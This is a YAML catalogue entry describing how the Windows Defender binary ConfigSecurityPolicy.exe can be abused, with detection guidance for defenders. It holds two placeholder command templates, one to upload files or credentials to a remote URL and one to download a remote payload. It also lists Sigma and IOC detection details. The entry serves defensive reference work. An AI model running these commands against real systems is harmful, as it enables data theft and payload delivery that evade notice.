---
Name: ConfigSecurityPolicy.exe
Description: Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.
Author: Ialle Teixeira
Created: 2020-09-04
Commands:
  - Command: ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
    Description: Upload file, credentials or data exfiltration in general
    Usecase: Upload file
    Category: Upload
    Privileges: User
    MitreID: T1567
    OperatingSystem: Windows 10
  - Command: ConfigSecurityPolicy.exe {REMOTEURL}
    Description: It will download a remote payload and place it in INetCache.
    Usecase: Downloads payload from remote server
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10, Windows 11
    Tags:
      - Download: INetCache
Full_Path:
  - Path: C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe
  - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_configsecuritypolicy.yml
  - IOC: ConfigSecurityPolicy storing data into alternate data streams.
  - IOC: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS.
  - IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe.
  - IOC: User Agent is "MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
Resources:
  - Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-switch-workloads
  - Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/workloads
  - Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-monitor
  - Link: https://twitter.com/NtSetDefault/status/1302589153570365440?s=20
Acknowledgement:
  - Person: Ialle Teixeira
    Handle: '@NtSetDefault'
  - Person: Nir Chako (Pentera)
    Handle: '@C_h4ck_0'
---
